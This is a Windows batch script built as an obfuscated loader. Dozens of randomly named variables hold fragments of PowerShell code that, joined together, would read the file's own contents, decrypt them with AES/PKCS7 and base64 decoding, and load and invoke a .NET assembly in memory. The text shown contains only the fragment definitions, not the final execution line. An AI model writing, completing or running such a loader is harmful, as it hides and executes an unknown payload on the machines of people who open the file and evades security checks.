@echo off
set "WidLkSyggq=)($t"
set "HvlTIScaZt=1] -"
set "hOTjOgSqIO=ddin"
set "lvCnsusqxt=ress"
set "FptAxiflUz=Rpk "
set "dihUoDUcrS= = $"
set "tksypaZgJQ=yste"
set "IcvuqpyzCD=pose"
set "hUKoWZXYfB=:('g"
set "XittmoFtQF=.Ass"
set "ylHmtiOCqD=ring"
set "EjtfuOZdkE=pL, "
set "NEMjZlMRjA=orF'"
set "aEDySOMOKR=[Sys"
set "zbfKogyeYA=l5E7"
set "BjJjWYMRgN=yGjL"
set "LtaMvyxISU=; };"
set "DBaXpASpOU=('%*'"
set "EzKDzichUx=brea"
set "HvwUIvpINK=.Cop"
set "xNOjsBIoXl=[-1."
set "zlcAjrcuGv=eMVs"
set "xmvGiMIrLL=.Con"
set "jdOBFPiIEb=CFxo"
set "IuPCOkJaxW=PKCS"
set "ZsSozBEraJ=yste"
set "QvIZePyWrJ=Syst"
set "TVlYZWRAAx=ecry"
set "tvaYKFWuDB=.Com"
set "nnvHhdjEls=d;$c"
set "QzsXNwMzUv=;$gV"
set "cRViaJqIDb=ddin"
set "KdqLmvnQdP=oint"
set "ZhvbrNIMxF=and "
set "OZBPkOcTbg=($ra"
set "PXRHbfYqIM=('%~f0'"
set "vKNXrJtOJj=ect "
set "cqRimKCFgx=ne);"
set "OCbxKTkOFz=)))"
set "llmZVsFdND=ke($"
set "DglxMjlYoe=rtS4"
set "fUboRppjiZ=]::N"
set "LBjzbQvjet=[IO."
set "RdvFoLrqLB=x.Pa"
set "xjHBtokxeo=KLs."
set "JGSSmYtpPG=s75K"
set "khRwpEgIDA=);$O"
set "rJFMMAqacP=;$Oy"
set "aSwkbxnpqR=CZ);"
set "qXJgLwfPpR=$gVR"
set "FlNyvIwJEo=-joi"
set "OCBJZausgz=$fwe"
set "DNDavoshfg=Syst"
set "gDZwRXadLP=Rpk."
set "tFUClLJYjc=();$"
set "oyzBYglvGt=)($c"
set "rDgKWlrPvT=k; }"
set "FKlLqoeoKs=7;$c"
set "QXDysTxqEG=esaB"
set "mFmvrKWuet=S46e"
set "eDRHzPviQO=);$c"
set "RDDquQWayh=join"
set "TMmaHeMXYo=rity"
set "JaJsHSYifJ=s.Su"
set "ddESMJxtvR=);$f"
